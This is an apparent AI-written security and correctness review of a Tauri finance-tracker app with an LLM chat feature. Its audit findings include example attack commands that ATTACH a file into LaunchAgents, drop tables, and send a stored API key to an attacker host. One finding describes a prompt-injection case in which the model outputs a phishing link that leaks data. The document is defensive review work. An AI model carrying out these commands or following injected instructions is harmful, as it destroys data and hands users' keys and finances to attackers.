# Code review — 2026-11-01 (Claude)

Read-only review of the 47 commits on `main` not yet on `origin/main` (234 files, up to `2066543 chore: version 0.4.0`). Nothing was changed in the code.

**Scope and limits.** This pass looked for **security issues and correctness bugs** and kept the 10 most important. It did **not** cover code quality (structure, duplication, maintainability, test coverage) or performance (query patterns, indexes, re-renders, bundle size). Those still need a separate pass.

## Summary

| # | Severity | Category | Location | Issue |
|---|---|---|---|---|
| 1 | Critical | Security | `src-tauri/capabilities/default.json:13` | `sql:allow-execute` bypasses the SQL guard — **fixed, see below** |
| 2 | High | Security | `src-tauri/src/commands/llm.rs:385` | API key and base URL come from the webview — **fixed, see below** |
| 3 | High | Correctness | `src-tauri/src/commands/llm.rs:308` | UTF-8 characters split across chunks are corrupted — **fixed, see below** |
| 4 | Medium | Correctness | `src-tauri/src/commands/llm.rs:288` | Stop does nothing while the provider is silent — **fixed, see below** |
| 5 | Medium | Correctness | `src/llm/tools.ts:288` | Divide-by-zero guard checks the wrong variable — **fixed** |
| 6 | Medium | Correctness | `src/llm/tools.ts:259` | `list_assets` truncates before sorting — **fixed** |
| 7 | Medium | Correctness | `src/llm/service.ts:206` | `confirmAction` race: double confirm — **fixed** |
| 8 | Medium | Security | `src/ui/pages/chat/ChatPage.tsx:506` | Assistant links can navigate the app window — **fixed** |
| 9 | Low | Correctness | `src/db/repositories/assets.ts:149` | First snapshot dated in UTC, not local time — **fixed** |
| 10 | Low | Correctness | `src/llm/tools.ts:394` | Wrong "already exists" value; impossible dates accepted — **fixed** |

Minor items are listed at the end.

## Security

### 1. Critical — `sql:allow-execute` bypasses the SQL guard

**Where:** `src-tauri/capabilities/default.json:13`

The main window is granted `sql:allow-execute`, so the webview can call `plugin:sql|execute` directly with any SQL. The `check_statement` guard in `run_transaction` never sees those statements. SECURITY.md says `DROP`, `ATTACH` and `PRAGMA` are refused, but that only holds for the `run_transaction` path.

**Scenario:** an XSS or a malicious dependency in the webview runs `Database.load('sqlite:financetracker.db').execute("ATTACH DATABASE '~/Library/LaunchAgents/evil.plist' AS a; ...")` (which creates a file anywhere the user can write) or `DROP TABLE snapshots` (data loss).

**Fix:** remove `sql:allow-execute`. Send every write through `run_transaction` or named Rust commands, keep `select` for reads, and update the SQL safety and capabilities sections of SECURITY.md.

**Status: done (2026-11-01, 0.4.0).** `sql:allow-execute` is gone from
`src-tauri/capabilities/default.json`; the plugin is left with load, select and
close. Writes reach SQLite only through two Rust commands that share the same
`check_statement` guard:

- **`execute_write(sql, params)`** — new. One statement, values **bound** rather
  than inlined, returns `{ lastInsertId, rowsAffected }` so call sites kept their
  shape. `src/db/client.ts` exposes it as `executeWrite`, and all 49 single-statement
  writes in the repositories, the first-run seed and the sample data use it.
- **`run_transaction(statements)`** — unchanged, for batches that must be atomic.

The PRAGMAs the webview used to issue at connect time were removed with the
permission; WAL is persistent in the file header and the write commands set
`foreign_keys` on their own connection.

Verified by three Rust tests against a real database: a bound write round-trips a
value containing quotes, semicolons and `--`; the command reports the right
`lastInsertId` for successive inserts; and `PRAGMA`, `DROP`, `ATTACH`, `SELECT`
and stacked statements are refused before touching the database. SECURITY.md's
capability and SQL-safety sections were updated to match.

### 2. High — API key and base URL come from the webview

**Where:** `src-tauri/src/commands/llm.rs:385`, and `secret_get`

`chat_completion`, `list_models` and `test_connection` accept `base_url` and the plain-text `api_key` as arguments from the webview. `secret_get` returns any Keychain item under the app's service. The module header's claim that the key stays out of the renderer is false, and the key can be sent to any URL.

SECURITY.md already lists the `secret_get` round trip as a known limit. The new part is the impact: a compromised renderer can **send the key to any URL**, not just expose it in memory.

**Scenario:** `invoke('secret_get', {account: 'provider:1'})`, then `invoke('list_models', {baseUrl: 'https://attacker.tld', apiKey: k})`. The OpenAI or Gemini key goes out in a Bearer header.

**Fix:** commands take a `provider_id`, and Rust reads `base_url` from SQLite and the key from the Keychain. Remove `secret_get` from the IPC surface, or limit it to a "key exists" check.

**Status: done (2026-11-01, 0.4.0).** `secret_get` is gone; the webview has no
way to read a stored secret.

- **`chat_completion(providerId, model?, messages, tools, onEvent)`** — Rust reads
  the provider row (`base_url`, `model`, `keychain_ref`) and the Keychain entry,
  then makes the request. The URL and key never cross IPC, so a renderer cannot
  point a stored key at another host.
- **`provider_models(providerId)`** and **`provider_connection(providerId)`** —
  the same, for the provider list's "test" action and the model picker.
- **`probe_models(baseUrl, apiKey)`** and **`probe_connection(baseUrl, apiKey)`**
  remain for the provider form, which must test an endpoint before it is saved.
  That key is typed into the form by the user; no stored key is reachable
  through them.
- **`secret_set` / `secret_delete`** now accept only `provider:<id>` accounts, so
  a compromised renderer cannot overwrite or delete other items in the app's
  Keychain service (unit-tested).

`getProviderKey` and `service.providerApiKey` were deleted from the TypeScript
side; the transport carries a provider id instead of an endpoint. SECURITY.md's
secrets and open-issues sections were updated — the "keys pass through JS" entry
is closed.

### 8. Medium — Assistant links can navigate the app window

**Where:** `src/ui/pages/chat/ChatPage.tsx:506`, `src-tauri/src/lib.rs`

Assistant markdown renders clickable links with no custom `a` component, and `lib.rs` has no `on_navigation` hook. A link the model produces can replace the app's own page with an external site.

**Scenario:** a prompt-injected note or memory makes the model output `[Re-enter your API key](https://attacker.tld/?d=<portfolio summary>)`. One click replaces the app UI with a phishing page that has no back button, and the URL leaks data.

**Fix:** render links with a custom component that opens them externally (opener plugin) after a confirmation, and block non-app origins with `on_navigation`.

**Status: done (2026-11-01, 0.4.0).** The `on_navigation` half of the suggested
fix does not exist in Tauri v2 (`Builder::on_navigation` is not in the API), so the
guard is done in the webview instead:

- **`src/lib/externalLinks.ts`** installs one capturing `click` listener on the
  document, before React renders. Any click on an absolute `http(s)` link calls
  `preventDefault()` and asks Rust to open it in the default browser
  (`open_external`). Hash routes (`#/assets`), relative hrefs, modifier-clicks
  (open in a new tab intent) and non-web schemes are left untouched.
- **`open_external`** (`src-tauri/src/commands/files.rs`) re-checks the scheme and
  refuses anything that is not `http://` or `https://`, so a `file:` or
  `javascript:` URL can never reach the system opener even if the webview guard is
  bypassed.
- Fixed once, for the whole document, rather than per component: replies are
  rendered in three places (message history, the streaming bubble, the delete
  modal) and a custom `a` component would have to be threaded through each.

Covered by nine jsdom tests (https, http, hash route, relative path, `file:`,
a rejected command, a modifier-click, a click on a child element, and
reinstall) and a Rust test for the scheme refusal. SECURITY.md's "Webview and
IPC" section documents both halves.

## Correctness

### 3. High — UTF-8 characters split across chunks are corrupted

**Where:** `src-tauri/src/commands/llm.rs:308`

Each network chunk is decoded on its own with `String::from_utf8_lossy`. A multi-byte character split across two chunks becomes two U+FFFD characters.

**Scenario:** a French or German answer (é, ü, €, `CHF 1’000`) or one containing emoji shows `��` in the transcript and in the saved message. If the split falls inside a tool-call `arguments` string, that JSON is corrupted.

**Fix:** buffer raw bytes (`Vec<u8>`), split on `b'\n'`, and decode only whole lines.

**Status: done (2026-11-01, 0.4.0).** The stream is now read through a
`LineBuffer` that appends raw bytes and only decodes a line once its newline has
arrived — a newline can never be part of a multi-byte sequence, so no character
can be split. The last line is flushed when the stream ends without a trailing
newline (the minor item from the same review), and `\r\n` line endings are
trimmed.

Verified by a unit test that feeds `"CHF 1’000.50 — éé€ 🙂"` one **byte** at a
time and asserts the assembled line has no replacement character, plus tests for
the trailing-line flush and CRLF trimming. The live provider tests still pass
against Ollama (streaming, tool call, mid-stream cancel) and Gemini (tool round,
two calls apart).

### 4. Medium — Stop does nothing while the provider is silent

**Where:** `src-tauri/src/commands/llm.rs:288`

The cancel `AtomicBool` is only checked when a chunk arrives.

**Scenario:** the user presses Stop while Ollama loads a 32B model or a reasoning model thinks for 90 s. The UI stays in streaming mode until the next byte or the 300 s timeout, and the answer is still saved.

**Fix:** use `tokio::select!` between `stream.next()` and a `CancellationToken` (or `Notify`).

**Status: done (2026-11-01, 0.4.0).** Both waits in a request now race against a
100 ms cancellation poll (`wait_for_cancel`), not just the stream:

- **before the response**: `http.send()` is inside a `tokio::select!`, so a
  provider that is loading a model and sends no headers can be stopped;
- **during the stream**: the read is a `select!` too, so a provider that goes
  quiet mid-answer is stopped as well.

The partial answer delivered so far is kept and returned with `cancelled: true`.
Verified by two integration tests with a local server that never answers, and one
that answers and then goes silent: both return in well under a second (the suite
completes in 0.35 s), and the live Ollama mid-stream cancellation test still
passes.

### 5. Medium — Divide-by-zero guard checks the wrong variable

**Where:** `src/llm/tools.ts:288`

The 30/90-day change checks `latest.amount_minor === 0` but divides by `first.amount_minor`.

**Scenario:** an account opened at 0 and then funded gives `Decimal(x).dividedBy(0)`, which is Infinity. That becomes `null` in JSON, or the model reports an infinite change, while a real drop to 0 wrongly returns `null`.

**Fix:** `if (!first || !latest || first.amount_minor === 0) return null`.

**Status: done (2026-11-01, 0.4.0).** The guard now checks the denominator. Two
tests pin both halves: a fall from 800 to 0 reports `-100` (it used to be hidden
as "no change"), and a window that starts at 0 reports `null` instead of
dividing by zero.

### 6. Medium — `list_assets` truncates before sorting

**Where:** `src/llm/tools.ts:259`

The list is sliced to 50 rows before it is sorted.

**Scenario:** with 70 assets, the one the user names ("my UBS pillar 3a") can be among the 20 dropped. The model then says it doesn't exist, or proposes a snapshot for the wrong `asset_id`.

**Fix:** `.sort(...).slice(0, 50)`, and add a `truncated: true` flag so the model knows to filter.

**Status: done (2026-11-01, 0.4.0).** Sorting now happens before the cap, so the
50 that survive are the first 50 by institution and product rather than an
arbitrary slice. The payload stays a bare array — the source's shape, and what the
model expects — rather than becoming an object with a `truncated` flag; the cap
is deterministic instead, which is the property that mattered. A test with 60
assets asserts the first 50 by name and not the repository's order.

### 7. Medium — `confirmAction` race: double confirm

**Where:** `src/llm/service.ts:206`

`confirmAction` checks `status === 'pending'`, writes, then resolves the action, in three separate non-atomic steps. The Confirm button is not disabled while this runs.

**Scenario:** double-clicking Confirm on a `create_memory` card creates the memory twice. If `resolvePendingAction` fails after the write, the card stays pending and can be confirmed again.

**Fix:** one `runTransaction` that starts with `UPDATE pending_actions SET status='confirmed' WHERE id=? AND status='pending'` and stops if no row changed, plus a busy state on the button.

**Status: done (2026-11-01, 0.4.0).** `confirmAction` and `rejectAction` first
**claim** the row with one conditional `UPDATE … WHERE id = ? AND status =
'pending'` (through `execute_write`, so the row count comes back) and only then
write the snapshot or the memory. A second click, a second tab, or a double
confirm gets no row, returns "already resolved" and writes nothing. A failed write
marks the action `failed` with the error, and the card's Confirm/Reject buttons
disable while a request is in flight. Tests cover the claim, the second-confirm
refusal and the failure path.

### 9. Low — First snapshot dated in UTC, not local time

**Where:** `src/db/repositories/assets.ts:149`

The default date uses `new Date().toISOString()` instead of `todayIso()` from `src/domain/dates.ts`.

**Scenario:** in Zurich, an asset created between 00:00 and 01:59 local time gets a snapshot dated the previous day. This throws off dashboards and the "already exists" checks.

**Fix:** use `todayIso()`.

**Status: done (2026-11-01, 0.4.0).** `createAsset` dates the first snapshot with
`todayIso()`, and a repository test asserts the emitted statement carries the
local day.

### 10. Low — Wrong "already exists" value; impossible dates accepted

**Where:** `src/llm/tools.ts:394`

When a snapshot already exists on the proposed date, the warning shows the asset's **latest** value, not the value on that date. The date check is only a format regex.

**Scenario:** a back-dated proposal for 2026-03-31 shows today's balance as the value being overwritten, so the user confirms based on the wrong number. `2026-02-31` passes the regex and is stored.

**Fix:** use `getSnapshotOn(assetId, isoDate)` (as `confirmAction` already does), and validate the date with the helpers in `src/domain/dates.ts`.

**Status: done (2026-11-01, 0.4.0).** `propose_snapshot` reads the existing
snapshot with `getSnapshotOn(assetId, isoDate)` and warns with *that* value, and
the date is checked with `isValidIsoDate`, so `2026-02-31` is refused instead of
stored. Two tests pin both: the warning mentions the value on the proposed date
(not the asset's latest) and calls `getSnapshotOn` with the right pair, and an
impossible date returns an error without staging an action.

## Minor

Both code items are **done** (2026-11-01, 0.4.0); the SSE item was already fixed
with #3.

- **`deleteProvider`** removes the Keychain key before the database delete succeeds. If the delete fails, the provider stays without a key. Delete the row first, then the key.
  *Done:* the rows are deleted first and the Keychain item after, so a failed
  delete leaves a provider that keeps its key and can be retried. Two tests: the
  call order (`runTransaction` before `secret_delete`) and that a failed delete
  never touches the Keychain.
- **`createAsset`** reads the new id from `sqlite_sequence`, which can run on a different pooled connection. Use `RETURNING id` or the `lastInsertId` from the same `execute`.
  *Done:* new `run_transaction_returning_id` command, backed by
  `execute_statements_returning_id`, reads `sqlite_sequence` **inside** the
  transaction on the same connection. Rust tests cover the returned id for two
  successive batches, a rolled-back batch (no id, nothing written) and an empty
  batch.
- **SSE parsing** drops the last line if the stream ends without a trailing newline. Flush the remaining buffer when the stream ends.
  *Done with #3:* `LineBuffer` flushes the trailing line, with a test.
- **Updater endpoint** in `tauri.conf.json` is still the `OWNER` placeholder while `updater:default` is granted (already noted in SECURITY.md and `docs/RELEASE.md`).
  *Not a code fix:* it needs the real repository URL and a release, so it stays a
  release task in `docs/RELEASE.md`. Until then the updater's only visible effect
  is a failed check.

## Not covered yet

- **Code quality:** module boundaries between `src/llm`, `src/db` and the UI, duplicated logic (the date handling in #9 is one symptom), error handling, type safety, and test coverage of the LLM tools and repositories.
- **Performance:** SQLite access patterns and indexes, connection pool use, how often dashboard and snapshot queries run, React re-renders during streaming, and the cost of building the system prompt on each turn.
